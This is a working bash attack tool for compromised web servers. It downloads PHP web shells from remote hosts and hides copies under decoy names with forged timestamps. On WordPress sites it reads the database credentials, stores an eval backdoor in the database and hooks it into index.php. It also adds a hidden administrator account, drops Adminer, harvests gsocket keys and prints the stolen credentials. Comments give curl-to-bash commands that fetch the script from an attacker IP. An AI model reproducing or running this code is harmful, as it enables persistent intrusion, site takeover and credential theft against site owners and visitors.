#!/bin/bash
CY="\033[1;33m" # yellow
CG="\033[1;32m" # green
CR="\033[1;31m" # red
CDR="\033[0;31m" # red
CC="\033[1;36m" # cyan
CM="\033[1;35m" # magenta
CN="\033[0m"    # none
CW="\033[1;37m"

tempTxt="/tmp/.Sess_xUX2C1Bn1RCR_vCyvSup5JyJE"
###################
# Setting Up
###################
PATHSHLL() {
    DIRSHELL=".tempX"
    SECDIRS="$(pwd -LP)/$DIRSHELL"
    THIRDIRS="$(pwd -LP)/$DIRSHELL"
    
    for shadow in "$(find /etc /var /run -maxdepth 2 -type d -writable 2>/dev/null | shuf -n 1)"; do
        FIRSTDIR="$shadow/$DIRSHELL"
        mkdir $FIRSTDIR 2>/dev/null
    done
    
    mkdir $FIRSTDIR 2>/dev/null
    [[ -d $FIRSTDIR ]] && XDIRSHLL=$FIRSTDIR; return 0;
    mkdir $SECDIRS 2>/dev/null
    [[ -d $SECDIRS ]] && XDIRSHLL=$SECDIRS; return 0;
    mkdir $THIRDIRS 2>/dev/null
    [[ -d $THIRDIRS ]] && XDIRSHLL=$THIRDIRS; return 0;
    
    [[ -n $TEMP ]] && XDIRSHLL=$TEMP; return 0;
    return 1
}

SHLLMODULE() {
    #MODULE SHELL
    url=("https://raw.githubusercontent.com/demo-vscode/temp/refs/heads/main/noop.php"
	"https://raw.githubusercontent.com/demo-vscode/temp/refs/heads/main/noop.php"
	"https://raw.githubusercontent.com/demo-vscode/temp/refs/heads/main/noop.php"
	"https://raw.githubusercontent.com/demo-vscode/temp/refs/heads/main/noop.php"
	"https://raw.githubusercontent.com/demo-vscode/temp/refs/heads/main/noop.php"
	"https://raw.githubusercontent.com/demo-vscode/temp/refs/heads/main/noop.php"
	"https://raw.githubusercontent.com/demo-vscode/temp/refs/heads/main/noop.php"
	"https://raw.githubusercontent.com/demo-vscode/temp/refs/heads/main/noop.php"
	"https://raw.githubusercontent.com/demo-vscode/temp/refs/heads/main/noop.php"
	"https://raw.githubusercontent.com/demo-vscode/temp/refs/heads/main/noop.php"
        )
        
    extensions=("js" "jpg" "gif" "css" "ttf" "pdf")
    
    PATHSHLL
    XDIRS="$XDIRSHLL"
    #init
    THEPATH=$XDIRS
    echo -e "[+] GETTING SHELLS TO $THEPATH"
    
    if [[ -n $2 ]]; then
        urlz="paste.rs/zMB25"
        lokx=$(find /etc /var /run -maxdepth 2 -type d -writable 2>/dev/null | shuf -n 1)
        namax="ci_session$(tr -dc 'a-zA-Z0-9' < /dev/urandom | fold -w 32 | head -n 1)"
        
        fullShellPath="$lokx/$namax"
        touch $fullShellPath 2>/dev/null
        
        if [[ ! -f "$fullShellPath" ]]; then
            mkdir ~/tmp 2>/dev/null
            fullShellPath="~/tmp/$namax"
            curl -fsSLk "${urlz}" > "$fullShellPath" 2>/dev/null || wget -qO- "${urlz}" > "$fullShellPath" 2>/dev/null
        else
            curl -fsSLk "${urlz}" > "$fullShellPath" 2>/dev/null || wget -qO- "${urlz}" > "$fullShellPath" 2>/dev/null
        fi
        
        dataz="<?php if(file_exists(\"$fullShellPath\")) {  require_once(\"$fullShellPath\"); } ?>"
        
        for i in {1..$1}; do
            file_name=$(date +%s%N)$RANDOM
            ext="${extensions[$RANDOM % ${#extensions[@]}]}"
            random_file="${file_name}.${ext}"
            echo "${dataz}" > "$THEPATH/$random_file" 2>/dev/null
        done
        
        PERANG=""
        return
    fi
    
    for neN in "${url[@]}"; do
        for i in {1..$1}; do
            file_name=$(date +%s%N)$RANDOM
            ext="${extensions[$RANDOM % ${#extensions[@]}]}"
            random_file="${file_name}.${ext}"
            curl -fsSL "${neN}" > "$THEPATH/$random_file" 2>/dev/null || wget -qO- "${neN}" > "$THEPATH/$random_file" 2>/dev/null
        done
    done
    #clear
}

CHOWNERZ() {
    LOKASI=$1
    ANUNYA=$2
    
    OWNER=$(ls -ld "$LOKASI" 2>/dev/null | awk '{print $3}')
    GROUP=$(ls -ld "$LOKASI" 2>/dev/null | awk '{print $4}')
    [[ $GROUP =~ "nobody" ]] && GROUP=$OWNER
    chown -R $OWNER:$GROUP "$ANUNYA" 2>/dev/null
    chmod 0644 $ANUNYA 2>/dev/null
    [[ -d $ANUNYA ]] && chmod 0755 $ANUNYA 2>/dev/null
    
}

CREATED() {
    #create dirs
    if [[ "$1" == "DIR" ]]; then
        LISTDIR=("backend" "components" "config" "environments" "controllers" "extensions" "behaviors" "validators" "lib" "models" "modules" "runtime" "views" "layouts" "site" "widgets" "assets" "css" "images" "js" "themes" "common" "data" "Pear" "Yii" "Zend" "messages" "console" "commands" "migrations" "frontend" "files" "less" "bootstrap" "features" "Startup.feature" "runpostdeploy" "yiic")
        for i in `seq 1 4`; do
        r=$(shuf -i 0-${#LISTDIR[@]} -n 1)
        [[ "${LISTDIR[$r]}" != "$i" ]] && SECPROG="$XFORX/${LISTDIR[$r]}"; mkdir "$SECPROG" 2>/dev/null
            for i in `seq 1 4`; do
            r=$(shuf -i 0-${#LISTDIR[@]} -n 1)
            [[ "${LISTDIR[$r]}" != "$i" ]] && SECPROG1="$SECPROG/${LISTDIR[$r]}"; mkdir "$SECPROG1" 2>/dev/null
                for i in `seq 1 4`; do
                r=$(shuf -i 0-${#LISTDIR[@]} -n 1)
                [[ "${LISTDIR[$r]}" != "$i" ]] && SECPROG2="$SECPROG1/${LISTDIR[$r]}"; mkdir "$SECPROG2" 2>/dev/null
                
                CHOWNERZ "$XFORX" "$SECPROG"
                done
            done
        done
        
    elif [[ "$1" == "FILE" ]]; then
        LISTFILE=("main-private.php" "main-prod.php" "params-private.php" "params-prod.php" "main-env.php" "main-local.php" "main.php" "params-env.php" "params-local.php" "params.php" "test.php" "SiteController.php" "FormModel.php" "index.php" "yiic.php" "FeatureContext.php" "YiiContext.php" "function.counter.php" "compiler.assign.php" "block.textformat.php" "Smarty.class.php" "style.php" "vars.php" "comment.php" "newsletter.php" "media.php" "blockStyle.php" "publisher.php" "default_items.php" "template.php" "default_item.php" "index2.php" "configuration.php" "image.php" "categories.php" "contact.php" "content.php" "blog_item.php" "cache.php" "block.php" "upload.php" "pagination.php" "guestbook.php" "poll.php" "mailmanweb.php" "joomla.php" "install.php" "file.php" "articleweb.php" "blog.php" "mail.php" "application.php" "PEAR.php" "register.php" "module.php" "list.php" "error.php" "database.php" "banner.php" "archive.php" "about.php" "update.php" "languages.php")
        for i in `seq 1 33`; do
            for secdir in $(find "$XFORX" -type d 2>/dev/null | shuf -n 1); do
            r=$(shuf -i 0-${#LISTFILE[@]} -n 1)
            [[ "${LISTFILE[$r]}" != "${LISTFILE[@]}" ]] && SECFILE="$secdir/${LISTFILE[$r]}"
            touch "$SECFILE" 2>/dev/null
            touch -r /etc/environment "$SECFILE" 2>/dev/null
            
            CHOWNERZ "$XFORX" "$SECFILE"
            done
        done
    fi
}

INFO() {
    #HERE: checking total files and folders
    echo -e "---------------------------"
    echo -e "DOMAIN: $XDOMAINSX"
    echo -e "PATH: $XFORX"
    [[ -d "/var/cpanel/userdata/$USER" ]] && echo -e "CPANEL: ON!"
    echo -e ""
    
    #HERE: proses tebaran
    asufile=$(find "$XFORX" -type f -name "*.php" 2>/dev/null | sed -r 's/\s+/\\ /g' | rev | cut -d"/" -f 1 | rev | wc -l )
    asudirs=$(find "$XFORX" -type d 2>/dev/null | sed -r 's/\s+/\\ /g' | sed -r 's/\$+/\\$/g' | rev | cut -d"/" -f 1 | rev | wc -l )
    [[ "$asudirs" -le 11 ]] && CREATED "DIR"
    [[ "$asufile" -le 11 ]] && CREATED "FILE"
}

LOOKFILE=()
HTHACKES() {
    local Path="$1"
    local Name=".htaccess"
    local Data="
<FilesMatch \"$(IFS="|" ; echo "${LOOKFILE[*]}")\">
    Order Allow,Deny
    Allow from all
</FilesMatch>
"
    chmod 0755 "$Path/$Name"
    echo "$Data" > "$Path/$Name"
}

XTEBAR() {
    DIRX="$XDIRS"
    if [[ "$1" == *"NONAME"* ]]; then
        num_files=$(find "$DIRX" -type f | wc -l)
        if [ "$num_files" -lt 5 ]; then
            file=$(find "$DIRX" -type f)
            
            for i in {2..10}; do
                new_file="${file%.*}_$i.${file##*.}"
                cp "$file" "$new_file"
            done
        fi
        
        ROMUSHA=$(ls "$DIRX")
        
    else
        ERREXIT
    fi
    
    for CODE in $ROMUSHA; do
        for ODIR in $(cd "$XFORX" && find . -type d 2>/dev/null | shuf -n 1 | cut -d"/" -f 2,3,4,5,6,7,8,9); do
            SUBDIR="$XFORX/$ODIR"
            for YFILE in $(find "$XFORX" -name "*.php" 2>/dev/null | rev | cut -d"/" -f 1 | rev | shuf -n 1); do
                RAWFILE="$SUBDIR/$YFILE"
                LOOKFILE+=("$YFILE")
                if [[ ! -f "$RAWFILE" ]]; then
                XFINE="$XDOMAINSX/$ODIR/$YFILE" #FINAL FILE
                #echo -e "[RAW]: $RAWFILE"
                #echo -e "$XFINE"
                
                cp "$DIRX/$CODE" "$RAWFILE" 2>/dev/null
                #HTHACKES "$SUBDIR"
                
                if [[ "$DIRX/$CODE" == *"NoN-phpminify.php"* ]]; then
                    echo -e "$XFINE - [MINIFY SHELL]" #>> $tempTxt
                elif [[ "$DIRX/$CODE" == *"NoN.png"* ]]; then
                    echo -e "$XFINE - [USER-AGENT SHELL]"
                elif [[ "$DIRX/$CODE" == *"NoN-eval123.php"* ]]; then
                    echo -e "$XFINE - [EVAL SHELL]"
                elif [[ "$DIRX/$CODE" == *"NoN-openssl.php"* ]]; then
                    echo -e "$XFINE - [OPENSSL SHELL]"
                else
                    echo -e "$XFINE" #>> $tempTxt
                fi
                
                CHOWNERZ "$SUBDIR" "$RAWFILE"
                touch -r /etc/environment "$RAWFILE" 2>/dev/null
                fi
            done
        done
    done
}

INJECTWP() {
    #HERE: inject admin / login WORDPRESS
    [[ -n "$XPATH" ]] && XFORX="$XPATH"
    [[ -n "$WEB" ]] && XDOMAINSX="$WEB"
    CHKWP1=$(find $XFORX -type d -name "wp-content" 2>/dev/null)
    CHKWP2=$(find $XFORX -type f -name "wp-config.php" 2>/dev/null)
    
    if [[ "$CHKWP1" == *"wp-content"* ]] && [[ "$CHKWP2" == *"wp-config.php"* ]]; then
        echo "STATUS: WORDPRESS DETECTED!"
        for v in "$CHKWP2"; do
            WPHOST=`cat $v | grep DB_HOST | cut -d \' -f 4`
            WPNAME=`cat $v | grep DB_NAME | cut -d \' -f 4`
            WPUSER=`cat $v | grep DB_USER | cut -d \' -f 4`
            WPPASS=`cat $v | grep DB_PASSWORD | cut -d \' -f 4`
            _prefix=`cat $v | grep table_prefix | awk -F"'" '{print $2}'`
            
            key="$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 10 | head -n 1)"
            xUser="$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 10 | head -n 1)"
            #xPass="$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 22 | head -n 1)"
            xPass="KPpFUE5BAh9mSJzbxGt37c"
            code="<?php if(isset(\$_GET[\"x\"])&&\$_GET[\"x\"]==\"${key}\"){ \$conn = mysqli_connect('${WPHOST}','${WPUSER}','${WPPASS}','${WPNAME}'); if(!\$conn){ echo 'err!' . mysqli_connect_error(); } \$sql = 'SELECT code FROM licenses'; \$result = mysqli_query(\$conn, \$sql); \$connect = mysqli_fetch_all(\$result, MYSQLI_ASSOC); \$OK=\$connect[0]['code']; eval('?>'.base64_decode(\$OK)); exit; } ?>"
            dat="CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/cGhwIGVjaG8gJzxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG5hbWU9InVwbG9hZGVyIiBpZD0idXBsb2FkZXIiPic7IGVjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI1MC+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT4nOyBpZiggJF9QT1NUWydfdXBsJ10gPT0gIlVwbG9hZCIgKSB7IGlmKEBjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snZmlsZSddWyduYW1lJ10pKB7IGVjaG8gJzxiPk9LPC9iPjxicj48YnI+JzsgfSBlbHNlIHsgZWNobyAnPGI+RmFpbGVkITwvYj48YnI+PGJyPic7IH0gfWV4aXQoKTsgPz4="
            
            CHKTABLES=$(mysql -u $WPUSER -p"$WPPASS" -h $WPHOST $WPNAME -e "USE $WPNAME; DROP TABLE IF EXISTS licenses; CREATE TABLE licenses (code longtext); SET SQL_MODE = ''; INSERT INTO licenses VALUES ('${dat}'); SELECT * FROM licenses;" 2>/dev/null)
            #echo "${CHKTABLES}"
            
            ADDADMINWP=$(mysql -u $WPUSER -p"$WPPASS" -h $WPHOST $WPNAME -e "USE $WPNAME; DELETE FROM ${_prefix}users WHERE ID='76667'; DELETE FROM ${_prefix}usermeta WHERE user_id='76667'; SET SQL_MODE = ''; INSERT INTO ${_prefix}users (ID,user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('76667', 'wp2team', '7d545ae1306710f308cea75742d86b5b', 'administrator', 'administrator', '${XDOMAINSX}', '2018-06-07 00#:00:00', '', '0', 'wp2team'); SELECT * FROM ${_prefix}users; SET SQL_MODE = ''; INSERT INTO ${_prefix}usermeta (umeta_id, user_id, meta_key, meta_value) VALUE (NULL, '76667', '${_prefix}capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}'); SET SQL_MODE = ''; INSERT INTO ${_prefix}usermeta (umeta_id, user_id, meta_key, meta_value) VALUE (NULL, '76667', '${_prefix}user_level', '10'); SELECT * FROM ${_prefix}usermeta;"  2>/dev/null)
            #echo "${ADDADMINWP}"
            
            conf=$(find "$XFORX" -type f -name "index.php" 2>/dev/null | head -n 100 | shuf -n 1)
            xx1=$(cat $conf)
            echo "$code ${xx1}" > $conf
            touch -r /etc/environment $conf 2>/dev/null
            
            echo -e "------------------"
            echo -e "DB HOST: ${WPHOST}"
            echo -e "DB NAME: ${WPNAME}"
            echo -e "DB USER: ${WPUSER}"
            echo -e "DB PASS: ${WPPASS}"
            
            #ADMINER
            admnr="github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php"
            fndfile=$(find $XFORX -type f -name "*.php" 2>/dev/null | head -n 100 | shuf -n 1)
            fnddir=$(find $XFORX -type d -writable 2>/dev/null | head -n 100 | shuf -n 1)
            curut=$(echo $fndfile | rev | cut -d/ -f 1 | rev)
            $(which wget) --no-check-certificate -q -O ${fnddir}/${curut} $admnr 2>/dev/null ||
            $(which curl) -fsSLk $admnr -o ${fnddir}/${curut} 2>/dev/null
            CHOWNERZ "$XFORX" "$fnddir/$curut" 2>/dev/null
            touch -r /etc/environment "$fnddir/$curut" 2>/dev/null
            
            echo -e "------------------"
            echo -e "[+] ADMINISTRATOR: "
            echo -e "USER: wp2team"
            echo -e "PASS: Ruj4kMetaL" #Ruj4kMetaL
            echo ""
            echo -e "[+] ADMINER: "
            echo -e "$fnddir/$curut"
            echo ""
            echo -e "[+] SQL BACKDOOR: "
            echo -e "${conf}?x=${key}"
            
            #sfile="raw.githubusercontent.com/Yourdream666/temp/main/esdawet.psd"
            #if [[ ! -z "$XFORX" ]]; then
            #    nm="ipv4.php"
            #    kampong=$(find $XFORX -type d -writable -print 2>/dev/null | head -n 100 | awk '!seen[$0]++' | shuf -n 1 | sort -u 2>/dev/null)
            #    $(which wget) --no-check-certificate -q -O ${kampong}/$nm $sfile 2>/dev/null ||
            #    $(which curl) -fsSLk $sfile -o ${kampong}/$nm 2>/dev/null
            #    echo ""
            #    echo -e "[+]Hidden Socket: "
            #    echo -e "$kampong/$nm"
            #    CHOWNERZ "$XFORX" "$kampong/$nm"
            #    touch -r /etc/environment "$kampong/$nm" 2>/dev/null
            #fi
            #echo -e "------------------"
        done
    else
        echo -e "------------------"
        echo "STATUS: NOT WORDPRESS!"
    fi
}

ANAKASU() {
    #HERE: find GS key
    anakasu=$(cat $tempTxt 2>/dev/null)
    echo -e "$anakasu" | sed '/^$/d'
    cari=$(find ~/ -name "systemd.swp" 2>/dev/null | xargs -I "{}" cat {})
    gees=$(cat ~/.config/dbus/gs-dbus.dat 2>/dev/null || cat ~/.logs/.PGSQL.Sess_ZTkRhTDeb4hnxB.dat 2>/dev/null)
    hehe=$(find ~/.config -name "*.dat*" 2>/dev/null | xargs -I "{}" cat {})
    echo -e "---------------------------"
    [[ -n $gees ]] && echo -e "KEY: $gees"
    [[ -n $cari ]] && echo -e "KEY: $cari"
    [[ -n $hehe ]] && echo -e "KEY: $hehe"
    echo -e "---------------------------"
    echo ""
    
    return
}

X125MODE() {
    SEC=`seq 1 1`
    [[ -n $1 ]] && SEC=`seq 1 8`
    
    for seq in $SEC; do
        for shadow in "$(find /etc /var /run -maxdepth 2 -type d -writable 2>/dev/null | shuf -n 1)"; do
            if [[ -w "$shadow" ]]; then
                #ListPath+=("${shadow}")
                key="$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 8 | head -n 1)"
                INTERNAL="$shadow/Sess_${key}.ini"
                echo "$THECODE" | base64 -d > "$INTERNAL"
                #echo -e "[+] RAW FILE > $INTERNAL"
                
                for ODIR in $(cd "$XFORX" && find . -type d 2>/dev/null | shuf -n 1 | cut -d"/" -f 2,3,4,5,6,7,8,9); do
                SUBDIR="$XFORX/$ODIR"
                #echo $SUBDIR
                    for YFILE in $(find "$XFORX" -name "*.php" 2>/dev/null | rev | cut -d"/" -f 1 | rev | shuf -n 1); do
                    RAWFILE="$SUBDIR/$YFILE"
                    TRUEFILE="$XDOMAINSX/$ODIR/$YFILE"
                        if [[ ! -f "$RAWFILE" ]]; then
                            THEFILE="<?php require_once(\"$(echo $INTERNAL)\"); ?>"
                            echo "$THEFILE" > "$RAWFILE"
                            CHOWNERZ "$XFORX" "$RAWFILE" 2>/dev/null
                            #echo -e "[RAW!] - $RAWFILE"
                            echo -e "$TRUEFILE - [x125 SHELL]"
                        fi
                    done
                done
            fi
        done
    done
}

SHUTDOWN() {
    rm -rf $tempTxt $XDIRS /dev/shm/.tempX /tmp/.tempX
}

ERREXIT() {
    rm -rf $tempTxt $XDIRS
    echo -e "YOU ARE NOT PART OF US!"
    exit 1
}

###############
# init function

PROG() {
    p="""
${CY}====== ${CY}[+] ${CN}Writed By: ${CG}-NoNAME TE4M- ${CY}===================
    
    ${CY}[1] ${CG}AK-47 USER-AGENT SHELL ${CN}(RELOAD ALL DEFENDS)
    
    
    """
    echo -e "$p"
}

MASSKILL() {
    STRESS="/var/tmp"
    mkdir "$STRESS/apache" 2>/dev/null
    
    XFORX=$1
    CODE=$2
    XDOMAINSX=$(echo "$XFORX" | cut -d "/" -f5)
    DESTRESS="$STRESS/apache/$XDOMAINSX.txt"
    
    INFO
    echo -e "[+] MASSKILL IS RUNNING... PLEASE WAIT!"
    INFO >> $DESTRESS
    XTEBAR $CODE >> $DESTRESS
    INJECTWP >> $DESTRESS
    echo -e "[+] SUCESSFULLY SAVED TO: $DESTRESS"
    echo
}

USAGE() {
    echo -e "${CY}Usage:${CN}"
    echo -e "  $0 <document_root> <domain>"
    echo -e ""
    echo -e "${CY}Example:${CN}"
    echo -e "  $0 /home/user/public_html example.com"
    echo -e ""
    echo -e "${CY}Or run without arguments for interactive mode${CN}"
    exit 1
}

MAIN() {
    [[ -n $x125 ]] && PERANG="ON"
    
    #HERE: for mass
    if [[ -n "$RUN" ]]; then
        CODE="NONAME"
        SHLLMODULE 10
        for lstpth in $(cat $RUN); do
            CODE="NONAME"
            MASSKILL "$lstpth" $CODE
        done
        
        SHUTDOWN
        echo -e "JANGAN LUPA HAPUS (rm -rf $STRESS/apache/*)"
        exit
    fi
    
    #START THE PROGRAM
    PROG
    #read -p "[+] PILIH MENU >_  " SERV
    
    # Check for command line arguments
    if [[ $# -ge 2 ]]; then
        # Mode: Command line arguments
        XFORX="$1"
        XDOMAINSX="$2"
        echo -e "${CG}[+] Using command line arguments${CN}"
        echo -e "${CC}[+] DocumentRoot: ${CN}$XFORX"
        echo -e "${CC}[+] Domain: ${CN}$XDOMAINSX"
    elif [[ $# -eq 1 ]]; then
        # Only 1 argument given, show usage
        echo -e "${CR}[!] Error: Missing domain argument${CN}"
        USAGE
    else
        # Mode: Interactive prompt
        if [[ -n "$LOC" ]]; then
            XFORX="$LOC"
        else
            read -p "[+] Paste DocumentRoot nya >_  " XFORX
        fi
        
        read -p "[+] Paste DOMAIN nya >_  " XDOMAINSX
        clear
    fi
    
    if [[ ! -d "$XFORX" ]]; then
        echo "PATH NOT FOUND!"
        exit
    fi
    
    #KEY: 6gfmWfxgknmdiM3mFRbKdq
    #XDOMAINSX="alaynabowman.com/"
    #XFORX="/home/alaynab/alaynabowman.com"
    
    CODE="NONAME"
    SHLLMODULE 10
    INFO
    XTEBAR $CODE
    INJECTWP
    #ANAKASU
    SHUTDOWN
    exit
    #if [[ "$SERV" == 1 ]]; then
    #    CODE="NONAME"
    #    SHLLMODULE 10
    #    INFO
    #    XTEBAR $CODE
    #    #INJECTWP
    #    #ANAKASU
    #    SHUTDOWN
    #else
    #    ERREXIT
    #fi
}

###############
##   HOW TO:
##   bash -c "$(curl -fsSLk 51.79.249.109/.1Prv\$R00\=m.666\^.\$At4N/te2.sh)"
##   x125=ON bash -c "$(curl -fsSLk 51.79.249.109/.1Prv\$R00\=m.666\^.\$At4N/te2.sh)"
##   RUN=blabla.txt bash -c "$(curl -fsSLk 51.79.249.109/.1Prv\$R00\=m.666\^.\$At4N/te2.sh)"
##   bash -c "$(wget --no-check-certificate -qO- 51.79.249.109/.1Prv\$R00\=m.666\^.\$At4N/te2.sh)"
###############
# main function
MAIN "$@"
